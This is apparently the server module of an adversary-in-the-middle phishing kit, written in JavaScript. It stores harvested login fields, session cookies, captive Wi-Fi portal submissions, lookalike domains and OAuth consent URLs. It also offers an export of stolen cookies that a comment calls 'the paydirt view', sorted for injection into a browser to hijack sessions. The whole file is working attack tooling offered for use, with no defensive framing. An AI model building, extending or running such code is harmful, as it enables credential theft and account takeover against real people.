function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT,
        path TEXT,
        fields TEXT,
        client_ip TEXT,
        captured_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS aitm_creds ON creds(client_id)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT,
        name TEXT,
        value TEXT,
        domain TEXT,
        path TEXT,
        secure INTEGER,
        http_only INTEGER,
        client_ip TEXT,
        captured_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS aitm_cookies ON cookies(client_id)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS lookalikes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        target TEXT,
        domain TEXT,
        kind TEXT,
        puny TEXT,
        detail TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS oauth (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        url TEXT,
        scopes TEXT,
        tenant TEXT,
        redirect TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "creds") {
      ctx.db.run(
        `INSERT INTO creds (client_id, host, path, fields, client_ip, captured_at) VALUES (?, ?, ?, ?, ?, ?)`,
        clientId, p.host || null, p.path || null, JSON.stringify(p.fields || {}), p.clientIp || null, now
      );
      ctx.broadcast("creds", { clientId, ...p });
    } else if (event === "cookie") {
      ctx.db.run(
        `INSERT INTO cookies (client_id, host, name, value, domain, path, secure, http_only, client_ip, captured_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        clientId, p.host || null, p.name || null, p.value || null, p.domain || null,
        p.path || null, p.secure ? 1 : 0, p.httpOnly ? 1 : 0, p.clientIp || null, now
      );
      ctx.broadcast("cookie", { clientId, ...p });
    } else if (event === "portal_submit") {
      ctx.db.run(
        `INSERT INTO creds (client_id, host, path, fields, client_ip, captured_at) VALUES (?, ?, ?, ?, ?, ?)`,
        clientId, "portal:" + (p.ssid || "wifi"), "/captive", JSON.stringify(p.fields || {}), p.clientIp || null, now
      );
      ctx.broadcast("portal_submit", { clientId, ...p });
    } else if (event === "lookalikes") {
      const list = Array.isArray(p.candidates) ? p.candidates : [];
      const tx = ctx.db.transaction(() => {
        ctx.db.run(`DELETE FROM lookalikes WHERE client_id = ?`, clientId);
        const ins = ctx.db.prepare(
          `INSERT INTO lookalikes (client_id, target, domain, kind, puny, detail, seen_at)
           VALUES (?, ?, ?, ?, ?, ?, ?)`
        );
        for (const c of list) {
          ins.run(clientId, p.target || null, c.domain || null, c.kind || null,
            c.puny || null, c.detail || null, now);
        }
      });
      tx();
      ctx.broadcast("lookalikes", { clientId, target: p.target, count: list.length });
    } else if (event === "oauth_url") {
      ctx.db.run(
        `INSERT INTO oauth (client_id, url, scopes, tenant, redirect, seen_at) VALUES (?, ?, ?, ?, ?, ?)`,
        clientId, p.url || null, p.scopes || null, p.tenant || null, p.redirect || null, now
      );
      ctx.broadcast("oauth_url", { clientId, ...p });
    } else if (event === "templates") {
      ctx.broadcast("templates", { clientId, templates: Array.isArray(p) ? p : [] });
    } else if (event === "proxy") {
      ctx.broadcast("proxy", { clientId, ...p });
    } else if (event === "dns_redirect") {
      ctx.broadcast("dns_redirect", { clientId, ...p });
    } else if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    list_creds(ctx, params = {}) {
      return ctx.db
        .query(`SELECT id, host, path, fields, client_ip AS clientIp, captured_at AS at
                FROM creds WHERE client_id = ? ORDER BY id DESC LIMIT 300`)
        .all(params.clientId || "")
        .map((r) => ({ ...r, fields: JSON.parse(r.fields || "{}") }));
    },

    list_cookies(ctx, params = {}) {
      return ctx.db
        .query(`SELECT id, host, name, value, domain, path, secure, http_only AS httpOnly,
                       client_ip AS clientIp, captured_at AS at
                FROM cookies WHERE client_id = ? ORDER BY id DESC LIMIT 300`)
        .all(params.clientId || "");
    },

    list_lookalikes(ctx, params = {}) {
      return ctx.db
        .query(`SELECT target, domain, kind, puny, detail FROM lookalikes
                WHERE client_id = ? ORDER BY kind, domain`)
        .all(params.clientId || "");
    },

    list_oauth(ctx, params = {}) {
      return ctx.db
        .query(`SELECT url, scopes, tenant, redirect, seen_at AS at FROM oauth
                WHERE client_id = ? ORDER BY id DESC LIMIT 20`)
        .all(params.clientId || "");
    },

    // The paydirt view: cookies that are worth injecting into a browser.
    // Sorted so the most session-like values come first.
    export_cookies(ctx, params = {}) {
      const rows = ctx.db
        .query(`SELECT host, name, value, domain, path, secure, http_only AS httpOnly
                FROM cookies WHERE client_id = ? ORDER BY captured_at DESC`)
        .all(params.clientId || "");
      const json = rows.map((r) => ({
        domain: r.domain || r.host || "",
        name: r.name,
        value: r.value,
        path: r.path || "/",
        secure: !!r.secure,
        httpOnly: !!r.httpOnly,
      }));
      return { cookies: json, count: json.length };
    },

    clear(ctx, params = {}) {
      const cid = params.clientId;
      for (const t of ["creds", "cookies", "lookalikes", "oauth"]) {
        if (cid) {
          ctx.db.run(`DELETE FROM ${t} WHERE client_id = ?`, cid);
        } else {
          ctx.db.run(`DELETE FROM ${t}`);
        }
      }
      return { ok: true };
    },
  },
};
